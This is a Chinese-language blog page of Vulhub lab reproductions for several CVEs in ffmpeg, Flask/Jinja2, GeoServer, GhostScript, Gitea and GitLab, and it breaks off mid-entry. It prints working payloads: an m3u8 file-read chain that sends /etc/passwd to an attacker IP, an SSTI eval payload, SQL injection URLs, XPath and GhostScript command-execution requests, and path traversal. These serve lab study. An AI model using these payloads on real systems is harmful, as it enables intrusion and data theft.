href="#ffmpeg-任意文件读取漏洞-SSRF漏洞-（CVE-2016-1897-CVE-2016-1898）" class="headerlink" title="ffmpeg 任意文件读取漏洞&#x2F;SSRF漏洞 （CVE-2016-1897&#x2F;CVE-2016-1898）"></a>ffmpeg 任意文件读取漏洞&#x2F;SSRF漏洞 （CVE-2016-1897&#x2F;CVE-2016-1898）</h1><blockquote><p>运行环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><h2 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h2><ul><li><a href="http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li><li><a href="http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">http://blog.neargle.com/SecNewsBak/drops/CVE-2016-1897.8%20-%20FFMpeg%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li><li><a href="http://habrahabr.ru/company/mailru/blog/274855/">http://habrahabr.ru/company/mailru/blog/274855/</a></li></ul><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>详见参考文章，不再赘述。</p></blockquote><h2 id="漏洞复现-53"><a href="#漏洞复现-53" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>三个链接死了两个 这里用的是[这个教程][<a href="https://www.freebuf.com/articles/web/258320.html]">https://www.freebuf.com/articles/web/258320.html]</a></p><blockquote><p>首先，我们需要在 web 服务器上创建一个 back.txt，文件内容是 m3u8 的格式，其中不包含文件结束符。<br>其次，我们再创建一个恶意的 m3u8 文件，文件内容通过 concat 拼接本地文件&#x2F;etc&#x2F;passwd。<br>最后，我们上传这个恶意的 m3u8 文件。<br>back.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:,</span><br><span class="line">http://your\_ip:9999/?</span><br></pre></td></tr></table></figure><p>upload.m3u8:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-TARGETDURATION:6</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://your\_ip/back.txt|file:///etc/passwd</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure><p>Tip: 以上的文件需要使用记事本编辑保存，选择默认 utf-8 格式。使用vim来编译可能会导致复现失败。</p><p>使用python来搭建一个简易的web，将back.txt部署到web上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8888</span><br><span class="line">或</span><br><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure><p>上传恶意m3u8文件，并监听9999端口</p><p>感谢师傅不断测试扫坑：<a href="https://www.freebuf.com/articles/web/258320.html">https://www.freebuf.com/articles/web/258320.html</a>.<br>以下均来自上面师傅的文章<br>在不断测试的过程中，最终发现，与 URL 长度，m3u8 请求 URL 都无关系，也没有 32 字节的限制。实际上 concat 连接 URL 时是不能包含换行符的。&#x2F;etc&#x2F;passwd 文件存储过程中换行符 \n 是占一个字符的，所以无论是通过 file 协议，还是 subfile 切片，只要是读取到 \n 则中断，后面的内容无法输出。</p></blockquote><p><img src="114.jpg" alt="114"></p><h1 id="ffmpeg-任意文件读取漏洞环境"><a href="#ffmpeg-任意文件读取漏洞环境" class="headerlink" title="ffmpeg 任意文件读取漏洞环境"></a>ffmpeg 任意文件读取漏洞环境</h1><blockquote><p>参考资料：</p><ul><li><a href="http://bobao.360.cn/learning/detail/4032.html">http://bobao.360.cn/learning/detail/4032.html</a></li><li><a href="https://hackerone.com/reports/242831">https://hackerone.com/reports/242831</a></li><li><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></li></ul></blockquote><h2 id="漏洞复现-54"><a href="#漏洞复现-54" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>漏洞原理不再赘述，直接下载exp，并生成payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 下载exp</span><br><span class="line">git clone https://github.com/neex/ffmpeg-avi-m3u-xbin</span><br><span class="line">cd ffmpeg-avi-m3u-xbin</span><br><span class="line"># 生成payload</span><br><span class="line">./gen\_xbin\_avi.py file:///etc/passwd exp.avi</span><br></pre></td></tr></table></figure><p>生成exp.avi，在<code>http://your-ip:8080/</code>上传。后端将会将你上传的视频用ffmpeg转码后显示，转码时因为ffmpeg的任意文件读取漏洞，可将文件信息读取到视频中：</p></blockquote><p><img src="115.jpg" alt="115"></p><blockquote><p>你也可以执行<code>docker compose exec web bash</code>进入本环境内部，测试ffmpeg。</p></blockquote><p>注：没法直接播放的话可以右键保存下来看</p><h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><blockquote><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li></ul></blockquote><h2 id="漏洞复现-55"><a href="#漏洞复现-55" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>编译及运行测试环境：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip/?name=&#123;&#123;233*233&#125;&#125;</code>，得到54289，说明SSTI漏洞存在。</p></blockquote><p><img src="116.jpg" alt="116"></p><blockquote><p>获取eval函数并执行任意python代码的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_() %&#125;</span><br><span class="line">&#123;% if c.\_\_name\_\_ == &#x27;catch\_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c.\_\_init\_\_.\_\_globals\_\_.values() %&#125;</span><br><span class="line">&#123;% if b.\_\_class\_\_ == &#123;&#125;.\_\_class\_\_ %&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;\_\_import\_\_(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</code>，得到执行结果：</p></blockquote><p><img src="117.jpg" alt="117"></p><h1 id="flink的俩漏洞readme没人翻译做个鸡毛啊"><a href="#flink的俩漏洞readme没人翻译做个鸡毛啊" class="headerlink" title="flink的俩漏洞readme没人翻译做个鸡毛啊"></a>flink的俩漏洞readme没人翻译做个鸡毛啊</h1><h1 id="GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）"><a href="#GeoServer-OGC-Filter-SQL注入漏洞（CVE-2023-25157）" class="headerlink" title="GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）"></a>GeoServer OGC Filter SQL注入漏洞（CVE-2023-25157）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在版本2.22.1和2.21.4及以前，多个OGC表达式中均存在SQL注入漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158">https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158</a></li><li><a href="https://github.com/advisories/GHSA-7g5f-wrx8-5ccf">https://github.com/advisories/GHSA-7g5f-wrx8-5ccf</a></li></ul></blockquote><h2 id="漏洞复现-56"><a href="#漏洞复现-56" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在利用漏洞前，需要目标服务器中存在类型是PostGIS的数据空间（datastore）和工作空间（workspace）。在Vulhub中，已经包含满足条件的工作空间，其信息如下：</p><ul><li>Workspace name: <code>vulhub</code></li><li>Data store name: <code>pg</code></li><li>Feature type (table) name: <code>example</code></li><li>One of attribute from feature type: <code>name</code></li></ul><p>利用这些已知参数，发送如下URL即可触发SQL注入漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/geoserver/ows?service=wfs&amp;version=1.0.0&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL\_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true</span><br></pre></td></tr></table></figure></blockquote><p><img src="118.jpg" alt="118"></p><p>可见，已经使用SQL注入获取到了目标服务器PostgreSQL的版本。</p><h1 id="GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）"><a href="#GeoServer-属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer 属性名表达式前台代码执行漏洞（CVE-2024-36401）</h1><blockquote><p>GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。</p><p>在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></li><li><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></li><li><a href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></li><li><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></li></ul></blockquote><h2 id="漏洞复现-57"><a href="#漏洞复现-57" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在官方<a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">漏洞通告</a>中提到可以找到漏洞相关的WFS方法：</p><blockquote><p>No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.</p></blockquote><p>比如，我这里使用<code>GetPropertyValue</code>来执行xpath表达式。参考<a href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">官方文档</a>，我构造了两个POC。基于GET方法的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#x27;touch%20/tmp/success1&#x27;) HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure><p>基于POST方法的POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /geoserver/wfs HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 356</span><br><span class="line">&lt;wfs:GetPropertyValue service=&#x27;WFS&#x27; version=&#x27;2.0.0&#x27;</span><br><span class="line">xmlns:topp=&#x27;http://www.openplans.org/topp&#x27;</span><br><span class="line">xmlns:fes=&#x27;http://www.opengis.net/fes/2.0&#x27;</span><br><span class="line">xmlns:wfs=&#x27;http://www.opengis.net/wfs/2.0&#x27;&gt;</span><br><span class="line">&lt;wfs:Query typeNames=&#x27;sf:archsites&#x27;/&gt;</span><br><span class="line">&lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#x27;touch /tmp/success2&#x27;)&lt;/wfs:valueReference&gt;</span><br><span class="line">&lt;/wfs:GetPropertyValue&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>熟悉的<code>java.lang.ClassCastException</code>错误，说明命令已执行成功。</p></blockquote><p><img src="119.jpg"><br><img src="120.jpg"></p><blockquote><p>进入容器可见，<code>touch /tmp/success1</code>与<code>touch /tmp/success2</code>均已成功执行。</p></blockquote><p><img src="121.jpg"></p><blockquote><p>值得注意的是，typeNames必须存在，我们可以在Web页面中找到当前服务器中的所有Types：</p></blockquote><p><img src="122.jpg"></p><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><blockquote><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p><ul><li><a href="http://seclists.org/oss-sec/2018/q3/142">http://seclists.org/oss-sec/2018/q3/142</a></li><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li></ul><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p></blockquote><h2 id="漏洞复现-58"><a href="#漏洞复现-58" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>上传&lt;poc.png&gt;，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker compose exec web bash</code>，将可以看到&#x2F;tmp&#x2F;success已被创建：</p></blockquote><p><img src="123.jpg" alt="123"></p><p><img src="124.jpg" alt="124"></p><blockquote><p>可见，id命令已被成功运行。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h1><blockquote><p>2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://blog.semmle.com/ghostscript-CVE-2018-19475/">https://blog.semmle.com/ghostscript-CVE-2018-19475/</a></li><li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700153">https://bugs.ghostscript.com/show_bug.cgi?id=700153</a></li></ul></blockquote><h2 id="漏洞复现-59"><a href="#漏洞复现-59" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: target</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Length: 279</span><br><span class="line">------WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Disposition: form-data; name=&quot;file\_upload&quot;; filename=&quot;1.jpg&quot;</span><br><span class="line">content-Type=&quot;image/png&quot;</span><br><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; for</span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; if</span><br><span class="line">(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file</span><br><span class="line">------WebKitFormBoundaryukZmnyhO--</span><br></pre></td></tr></table></figure><p>命令已成功执行：</p></blockquote><p><img src="125.jpg" alt="125"><br><img src="126.jpg" alt="126"></p><blockquote><p>当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞。</p></blockquote><h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><blockquote><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令&#x2F;读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><p>参考链接：</p><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&desc=2">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2</a></li><li><a href="https://www.anquanke.com/post/id/170255">https://www.anquanke.com/post/id/170255</a></li></ul></blockquote><h2 id="漏洞复现-60"><a href="#漏洞复现-60" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>作者给出了<a href="poc.png">POC</a>，上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p></blockquote><p><img src="127.jpg" alt="127"></p><h1 id="Gitea-1-4-0-目录穿越导致命令执行漏洞"><a href="#Gitea-1-4-0-目录穿越导致命令执行漏洞" class="headerlink" title="Gitea 1.4.0 目录穿越导致命令执行漏洞"></a>Gitea 1.4.0 目录穿越导致命令执行漏洞</h1><blockquote><p>Gitea是从gogs衍生出的一个开源项目，是一个类似于Github、Gitlab的多用户Git仓库管理平台。其1.4.0版本中有一处逻辑错误，导致未授权用户可以穿越目录，读写任意文件，最终导致执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html">https://security.szurek.pl/gitea-1-4-0-unauthenticated-rce.html</a></li><li><a href="https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html">https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html</a></li></ul></blockquote><h2 id="漏洞复现-61"><a href="#漏洞复现-61" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>安装完成后，创建一个公开的仓库，随便添加点文件进去（比如使用选定的文件和模板初始化仓库）：</p><p><img src="128.jpg" alt="128"></p><p>然后，需要执行一次<code>docker compose restart</code>重启gitea服务。（原因详见第二个参考链接）</p></blockquote><blockquote><p>由于漏洞链整体利用比较复杂，我们只复现文件读取部分，剩余利用方法详见第二个参考链接。</p><p>打开gitea，找到刚才创建的公开项目，如<code>vulhub/repo</code>，发送如下数据包，添加一个Git LFS对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /vulhub/repo.git/info/lfs/objects HTTP/1.1</span><br><span class="line">Host: your-ip:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: application/vnd.git-lfs+json</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 151</span><br><span class="line">&#123;</span><br><span class="line">&quot;Oid&quot;: &quot;....../../../etc/passwd&quot;,</span><br><span class="line">&quot;Size&quot;: 1000000,</span><br><span class="line">&quot;User&quot; : &quot;a&quot;,</span><br><span class="line">&quot;Password&quot; : &quot;a&quot;,</span><br><span class="line">&quot;Repo&quot; : &quot;a&quot;,</span><br><span class="line">&quot;Authorization&quot; : &quot;a&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，访问<code>http://your-ip:3000/vulhub/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth</code>，即可看到<code>/etc/passwd</code>已被成功读取：</p></blockquote><p><img src="129.jpg" alt="129"><br><img src="130.jpg" alt="130"></p><h1 id="GitLab-任意文件读取漏洞（CVE-2016-9086）"><a href="#GitLab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="GitLab 任意文件读取漏洞（CVE-2016-9086）"></a>GitLab 任意文件读取漏洞（CVE-2016-9086）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在8.9版本后添加的“导出、导入项目”功能，因为没有处理好压缩包中的软连接，已登录用户可以利用这个功能读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/">https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/</a></li><li><a href="https://hackerone.com/reports/178152">https://hackerone.com/reports/178152</a></li><li><a href="http://paper.seebug.org/104/">http://paper.seebug.org/104/</a></li></ul><p>环境运行后，访问<code>http://your-ip:8080</code>即可查看GitLab主页，其ssh端口为10022，默认管理员账号、密码是<code>root</code>、<code>vulhub123456</code>。</p><blockquote><p>注意，请使用2G及以上内存的VPS或虚拟机运行该环境，实测1G内存的机器无法正常运行GitLab（运行后502错误）。</p></blockquote></blockquote><h2 id="漏洞复现-62"><a href="#漏洞复现-62" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>注册并登录用户，新建一个项目，点击<code>GitLab export</code>：</p></blockquote><p><img src="131.jpg" alt="131"></p><blockquote><p>在导入页面，将&lt;test.tar.gz&gt;上传，将会读取到<code>/etc/passwd</code>文件内容：</p></blockquote><p><img src="132.jpg" alt="132"></p><h1 id="GitLab-远程命令执行漏洞（CVE-2021-22205）"><a href="#GitLab-远程命令执行漏洞（CVE-2021-22205）" class="headerlink" title="GitLab 远程命令执行漏洞（CVE-2021-22205）"></a>GitLab 远程命令执行漏洞（CVE-2021-22205）</h1><blockquote><p>GitLab是一款Ruby开发的Git项目管理平台。在11.9以后的GitLab中，因为使用了图片处理工具ExifTool而受到漏洞<a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">CVE-2021-22204</a>的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在GitLab服务器上执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://hackerone.com/reports/1154542">https://hackerone.com/reports/1154542</a></li><li><a href="https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html">https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html</a></li><li><a href="https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/">https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/</a></li><li><a href="https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml</a></li></ul></blockquote><h2 id="漏洞复现-63"><a href="#漏洞复现-63" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>GitLab的&#x2F;uploads&#x2F;user接口可以上传图片且无需认证，利用&lt;poc.py&gt;脚本来测试这个漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;python poc.py http://your-ip:8080 &quot;touch /tmp/success&quot;</span><br></pre></td></tr></table></figure></blockquote><p><img src="133.jpg" alt="133"></p><blockquote><p>进入容器内，可见<code>touch /tmp/success</code>已成功执行：</p></blockquote><p><img src="134.jpg" alt="134"></p><h1 id="gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）"><a href="#gitlist-0-6-0-远程命令执行漏洞（CVE-2018-1000533）（未完成）" class="headerlink" title="gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）"></a>gitlist 0.6.0 远程命令执行漏洞（CVE-2018-1000533）（未完成）</h1><blockquote><p>gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本及以前，存在一处命令参数注入问题，可以导致远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322">https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a></li><li><a href="https://www.exploit-db.com/exploits/44548">https://www.exploit-db.com/exploits/44548</a></li><li><a 